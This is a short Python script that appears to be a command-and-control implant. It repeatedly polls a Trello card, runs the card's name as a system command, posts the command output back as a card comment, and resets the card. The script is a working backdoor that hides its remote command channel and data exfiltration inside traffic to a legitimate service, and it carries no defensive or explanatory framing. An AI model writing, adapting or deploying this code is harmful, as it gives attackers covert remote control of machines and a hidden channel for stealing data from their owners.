import requests
import json
import subprocess

API_KEY = "REDACTED"
TOKEN = "REDACTED"
CARD_ID = "REDACTED"

def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output

while True:
    card_url = f"https://api.trello.com/1/cards/{CARD_ID}"
    comment_url = f"https://api.trello.com/1/cards/{CARD_ID}/actions/comments"
    headers = {
    "Accept": "application/json"
    }
    query = {
    'key': API_KEY,
    'token': TOKEN
    }
    response = requests.request(
    "GET",
    card_url,
    headers=headers,
    params=query
    )
    response_json = response.json()
    if response_json.get('name') == "nothing":
        continue

    output = Exec(response_json.get('name')).decode()
    data = {
        "text":output
    }
    requests.post(comment_url,params=query,headers=headers,data=data)
    requests.put(card_url,params=query,headers=headers,data={"name":"nothing"})